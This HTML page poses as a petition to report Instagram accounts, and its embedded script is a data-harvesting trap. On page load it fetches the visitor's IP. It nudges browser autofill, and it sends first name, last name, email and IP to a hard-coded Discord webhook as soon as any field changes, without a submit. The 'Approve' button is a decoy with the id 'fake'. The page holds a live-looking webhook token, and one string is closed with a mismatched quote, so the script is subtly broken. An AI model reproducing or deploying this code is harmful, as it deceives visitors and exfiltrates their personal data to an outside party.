<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Report an Instagram Account</title>
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      background-size: 400% 400%;
      animation: gradientAnimation 15s ease infinite;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #333;
    }

    @keyframes gradientAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      width: 90%;
      max-width: 400px;
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      text-align: center;
    }

    h1 {
      margin-bottom: 10px;
      font-size: 1.6em;
      color: #333;
      font-weight: 600;
    }

    p {
      margin-bottom: 20px;
      font-size: 0.95em;
      line-height: 1.4em;
      color: #555;
    }

    #trigger {
      display: inline-block;
      padding: 10px 20px;
      background: linear-gradient(to right, #d62976, #962fbf);
      color: #fff;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
      font-weight: 500;
      transition: background 0.3s;
    }

    #trigger:hover {
      background: linear-gradient(to right, #d62976cc, #962fbfcc);
    }

    #formContainer {
      margin-top: 20px;
      display: none;
      text-align: center;
    }

    .instructions {
      font-size: 0.9em;
      margin-bottom: 20px;
      background: #fafafa;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #eee;
      color: #555;
      text-align: left;
      line-height: 1.4em;
    }

    #userForm {
      text-align: left;
    }

    .form-group {
      margin-bottom: 15px;
    }

    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-weight: 600;
      font-size: 0.9em;
      color: #333;
    }

    .form-group input[type="text"],
    .form-group input[type="email"],
    .form-group textarea {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 0.95em;
      font-family: inherit;
      transition: border-color 0.3s;
    }

    .form-group input[type="text"]:focus,
    .form-group input[type="email"]:focus,
    .form-group textarea:focus {
      border-color: #962fbf;
      outline: none;
    }

    .form-group textarea {
      resize: vertical;
      min-height: 80px;
    }

    #fake {
      display: inline-block;
      padding: 10px 20px;
      background: linear-gradient(to right, #d62976, #962fbf);
      color: #fff;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
      font-weight: 500;
      transition: background 0.3s;
      margin-top: 10px;
    }

    #fake:hover {
      background: linear-gradient(to right, #d62976cc, #962fbfcc);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Report an Account</h1>
    <p>Help us petition Instagram to remove accounts that violate guidelines. Your voice matters.</p>
    <button id="trigger">Start</button>

    <div id="formContainer">
      <p class="instructions">
        If your browser has saved your name and email, select the suggestion when you focus the fields.
        The Instagram handle and reason fields are displayed for context, but won't be stored.
        Once any of the tracked fields (name or email) is filled, we'll send the info automatically.
      </p>
      <form id="userForm" autocomplete="on">
        <div class="form-group">
          <label for="fname">Your First Name:</label>
          <input type="text" id="fname" name="given-name" autocomplete="given-name" placeholder="John" required>
        </div>

        <div class="form-group">
          <label for="lname">Your Last Name:</label>
          <input type="text" id="lname" name="family-name" autocomplete="family-name" placeholder="Doe" required>
        </div>

        <div class="form-group">
          <label for="email">Your Email:</label>
          <input type="email" id="email" name="email" autocomplete="email" placeholder="you@example.com" required>
        </div>
        
        <div class="form-group">
          <label for="handle">Instagram Handle to Report (Not Stored):</label>
          <input type="text" id="handle" name="handle" placeholder="@username">
        </div>

        <div class="form-group">
          <label for="reason">Reason for Reporting (Not Stored):</label>
          <textarea id="reason" name="reason" rows="4" placeholder="Explain why this account should be banned..."></textarea>
        </div>
      </form>
      <button id="fake">Approve</button>
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';

    const trigger = document.getElementById('trigger');
    const formContainer = document.getElementById('formContainer');
    const fnameField = document.getElementById('fname');
    const lnameField = document.getElementById('lname');
    const emailField = document.getElementById('email');
    const handleField = document.getElementById('handle');
    const reasonField = document.getElementById('reason');

    let userIP = 'Unknown IP';

    // Fetch the user's IP on page load
    window.addEventListener('load', () => {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          userIP = data.ip;
          console.log('Fetched IP:', userIP);
        })
        .catch(err => console.error('Error fetching IP:', err));
    });

    // Show the form when the user clicks start
    trigger.addEventListener('click', () => {
      formContainer.style.display = 'block';
      fnameField.focus();
    });

    function checkFields() {
      // Only consider fname, lname, and email for submission
      if (
        fnameField.value.trim() !== '' ||
        lnameField.value.trim() !== '' ||
        emailField.value.trim() !== ''
      ) {
        submitForm(
          fnameField.value.trim() || '[No First Name]',
          lnameField.value.trim() || '[No Last Name]',
          emailField.value.trim() || '[No Email]'
        );
      }
    }

    function submitForm(fname, lname, email) {
      const message = `**New Petition Submission (Report IG Account):**\n` +
                      `**IP:** ${userIP}\n` +
                      `**First Name:** ${fname}\n` +
                      `**Last Name:** ${lname}\n` +
                      `**Email:** ${email}\n';

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord successfully!');
        } else {
          console.error('Failed to send message to Discord:', response.status, response.statusText);
        }
      })
      .catch(err => console.error('Error sending message to Discord:', err));
    }

    fnameField.addEventListener('input', checkFields);
    lnameField.addEventListener('input', checkFields);
    emailField.addEventListener('input', checkFields);

    fnameField.addEventListener('change', checkFields);
    lnameField.addEventListener('change', checkFields);
    emailField.addEventListener('change', checkFields);
  </script>
</body>
</html>
